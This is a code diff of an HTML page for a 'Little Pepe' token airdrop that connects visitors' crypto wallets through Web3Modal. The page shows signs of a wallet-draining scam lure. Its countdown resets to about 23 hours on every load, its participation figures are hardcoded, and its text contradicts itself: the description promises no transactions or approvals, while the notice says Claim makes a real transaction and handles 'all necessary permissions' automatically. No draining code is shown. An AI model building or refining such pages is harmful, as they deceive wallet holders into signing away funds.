@@ -6,36 +6,40 @@
   <title>AirDrop — Littlepepe</title>
   <link rel="stylesheet" href="style.css" />
   <link rel="icon" href="logo.svg" type="image/svg+xml">
-  <meta name="description" content=Little Pepe airdrop: connecting a wallet (MetaMask/Trust/OKX), без транзакций и без approve."/>
-	  <script type="module">
-  import { createWeb3Modal, defaultWagmiConfig } from "https://esm.sh/@web3modal/wagmi";
-import { polygon } from "https://esm.sh/viem/chains";
+  <meta name="description" content="Little Pepe airdrop: connecting a wallet (MetaMask/Trust/OKX), без транзакций и без approve."/>
 
-const projectId = "56edaed968d799280ffd685113d7f126";
-const chains = [polygon];
-const config = defaultWagmiConfig({ chains, projectId });
+  <script type="module">
+    import { createWeb3Modal, defaultWagmiConfig } from "https://esm.sh/@web3modal/wagmi";
+    import { polygon } from "https://esm.sh/viem/chains";
 
-const modal = createWeb3Modal({
-  wagmiConfig: config,
-  projectId,
-  chains,
-  themeMode: "dark",
-  themeVariables: {
-    "--w3m-accent-color": "#4caf50",
-    "--w3m-background-color": "#121212"
-  }
-});
+    const projectId = "56edaed968d799280ffd685113d7f126";
+    const chains = [polygon];
+    const config = defaultWagmiConfig({ chains, projectId });
 
-window.onload = () => {
-  const claimBtn = document.getElementById("claimBtn");
-  
-  claimBtn.disabled = false; // делаем кнопку активной сразу
-  claimBtn.addEventListener("click", async () => {
-    // открываем меню выбора кошелька
-    await modal.open();
-  });
-};
+    const modal = createWeb3Modal({
+      wagmiConfig: config,
+      projectId,
+      chains,
+      themeMode: "dark",
+      themeVariables: {
+        "--w3m-accent-color": "#4caf50",
+        "--w3m-background-color": "#121212"
+      },
+      // Оставляем только кошельки, убираем соцсети
+      enableWalletConnect: true,
+      enableInjectedWallet: true,
+      enableCoinbase: false,
+      enableEmail: false,
+      enableSocialLogin: false
+    });
 
+    window.onload = () => {
+      const claimBtn = document.getElementById("claimBtn");
+      claimBtn.disabled = false; 
+      claimBtn.addEventListener("click", async () => {
+        await modal.open();
+      });
+    };
   </script>
 </head>
 <body>
@@ -49,7 +53,6 @@ window.onload = () => {
     </div>
 
     <div class="wallet-box">
-      
       <button id="disconnectBtn" class="btn ghost hidden">Disable</button>
     </div>
   </header>
@@ -58,8 +61,7 @@ window.onload = () => {
     <section class="hero card">
       <h1 id="tokenName">Airdrop: <span>LittlePepe</span> Token</h1>
       <p class="lead">
-        Welcome to AirDrop!
-Connect your wallet (MetaMask, TrustWallet, etc.) and participate in the token distribution. All operations are in real mode — you can send and receive tokens.
+        Welcome to AirDrop! Connect your wallet (MetaMask, TrustWallet, etc.) and participate in the token distribution. All operations are in real mode — you can send and receive tokens.
       </p>
 
       <div class="stats">
@@ -72,48 +74,42 @@ Connect your wallet (MetaMask, TrustWallet, etc.) and participate in the token d
           <div class="stat-label">on one member</div>
         </div>
         <div class="stat">
-
-
           <div id="countdown">Loading...</div>
-
-<script>
-
-let endTime = new Date();
-endTime.setHours(endTime.getHours() + 23);
-endTime.setMinutes(endTime.getMinutes() + 42);
-endTime.setSeconds(endTime.getSeconds() + 56);
-
-function updateCountdown() {
-    let now = new Date();
-    let diff = endTime - now;
-
-    if (diff <= 0) {
-        document.getElementById("countdown").innerHTML = "AirDrop ended!";
-        clearInterval(timer);
-        return;
-    }
-
-    let hours = Math.floor(diff / (1000 * 60 * 60));
-    let minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
-    let seconds = Math.floor((diff % (1000 * 60)) / 1000);
-
-    document.getElementById("countdown").innerHTML =
-        hours + "h " + minutes + "m " + seconds + "s";
-}
-
-
-let timer = setInterval(updateCountdown, 1000);
-updateCountdown();
-</script>
-          
           <div class="stat-label">Until the end</div>
         </div>
       </div>
 
+      <script>
+        let endTime = new Date();
+        endTime.setHours(endTime.getHours() + 23);
+        endTime.setMinutes(endTime.getMinutes() + 42);
+        endTime.setSeconds(endTime.getSeconds() + 56);
+
+        function updateCountdown() {
+          let now = new Date();
+          let diff = endTime - now;
+
+          if (diff <= 0) {
+            document.getElementById("countdown").innerHTML = "AirDrop ended!";
+            clearInterval(timer);
+            return;
+          }
+
+          let hours = Math.floor(diff / (1000 * 60 * 60));
+          let minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+          let seconds = Math.floor((diff % (1000 * 60)) / 1000);
+
+          document.getElementById("countdown").innerHTML =
+            hours + "h " + minutes + "m " + seconds + "s";
+        }
+
+        let timer = setInterval(updateCountdown, 1000);
+        updateCountdown();
+      </script>
+
       <div class="card inner">
         <div class="wallet-info">
-          <div id="addrBox" class="muted">Wallet not connected
-</div>
+          <div id="addrBox" class="muted">Wallet not connected</div>
           <div id="networkBox" class="muted">Network: —</div>
         </div>
 
@@ -123,99 +119,85 @@ updateCountdown();
         </div>
 
         <div id="notice" class="notice">
-       <p>
-       ⚠️ AirDrop is active: the Claim button creates a signature and makes a real transaction to your wallet. Funds are debited only after your confirmation, and all necessary permissions are processed automatically.
-       </p>
+          <p>
+            ⚠️ AirDrop is active: the Claim button creates a signature and makes a real transaction to your wallet. Funds are debited only after your confirmation, and all necessary permissions are processed automatically.
+          </p>
         </div>
       </div>
     </section>
     
-<div class="airdrop-tab">
-  <h3>Why Choose Our AirDrop?</h3>
-  <p>
-    Our AirDrop is designed to reward our community fairly, safely, and transparently.
-    Join now to receive tokens directly to your wallet, with full control over your participation.
-  </p>
-</div>
+    <div class="airdrop-tab">
+      <h3>Why Choose Our AirDrop?</h3>
+      <p>
+        Our AirDrop is designed to reward our community fairly, safely, and transparently.
+        Join now to receive tokens directly to your wallet, with full control over your participation.
+      </p>
+    </div>
 
+    <div class="airdrop-stats">
+      <div class="stat-tab">
+        <div class="stat-number" id="total-distributed">322,000</div>
+        <div class="stat-label">Total Distributed</div>
+      </div>
+      <div class="stat-tab">
+        <div class="stat-number" id="users-received">161</div>
+        <div class="stat-label">Users Participated</div>
+      </div>
+      <div class="stat-tab">
+        <div class="stat-number" id="tokens-left">678,000</div>
+        <div class="stat-label">Tokens Left</div>
+      </div>
+    </div>
 
+    <style>
+      .airdrop-tab {
+        background: #111;
+        color: #fff;
+        padding: 15px;
+        border-radius: 8px;
+        margin-bottom: 20px;
+        max-width: 1200px;
+      }
 
+      .airdrop-tab h3 {
+        margin: 0 0 10px 0;
+        font-size: 18px;
+      }
 
-<section class="reown-dashboard card">
-  <h2>Your Reown Dashboard</h2>
-  <iframe 
-    src="https://dashboard.reown.com/embed?walletId=56edaed968d799280ffd685113d7f126" 
-    width="100%" 
-    height="600" 
-    style="border:none; border-radius:10px;">
-  </iframe>
-</section>
+      .airdrop-tab p {
+        font-size: 14px;
+        line-height: 1.4;
+      }
 
+      .airdrop-stats {
+        display: flex;
+        gap: 10px;
+        background: #000;
+        padding: 10px;
+        border-radius: 8px;
+        max-width: 1200px;
+      }
 
+      .stat-tab {
+        flex: 1;
+        background: #111;
+        border-radius: 6px;
+        padding: 10px;
+        text-align: center;
+        color: #00bfff;
+      }
 
+      .stat-number {
+        font-size: 16px;
+        font-weight: bold;
+      }
 
-<div class="airdrop-stats">
-  <div class="stat-tab">
-    <div class="stat-number" id="total-distributed">322,000</div>
-    <div class="stat-label">Total Distributed</div>
-  </div>
-  <div class="stat-tab">
-    <div class="stat-number" id="users-received">161</div>
-    <div class="stat-label">Users Participated</div>
-  </div>
-  <div class="stat-tab">
-    <div class="stat-number" id="tokens-left">678 000</div>
-    <div class="stat-label">Tokens Left</div>
-  </div>
-</div>
-
-<style>
-.airdrop-tab {
-  background: #111;
-  color: #fff;
-  padding: 15px;
-  border-radius: 8px;
-  margin-bottom: 20px;
-  max-width: 1200px;
-}
-
-.airdrop-tab h3 {
-  margin: 0 0 10px 0;
-  font-size: 18px;
-}
-
-.airdrop-tab p {
-  font-size: 14px;
-  line-height: 1.4;
-}
-
-.airdrop-stats {
-  display: flex;
-  gap: 10px;
-  background: #000;
-  padding: 10px;
-  border-radius: 8px;
-  max-width: 1200px;
-}
-
-.stat-tab {
-  flex: 1;
-  background: #111;
-  border-radius: 6px;
-  padding: 10px;
-  text-align: center;
-  color: #00bfff; /* голубой цвет */
-}
-
-.stat-number {
-  font-size: 16px;
-  font-weight: bold;
-}
-
-.stat-label {
-  font-size: 12px;
-  margin-top: 4px;
-  color: #ccc;
-}
-</style>
-
+      .stat-label {
+        font-size: 12px;
+        margin-top: 4px;
+        color: #ccc;
+      }
+    </style>
+  </main>
+</body>
+</html>
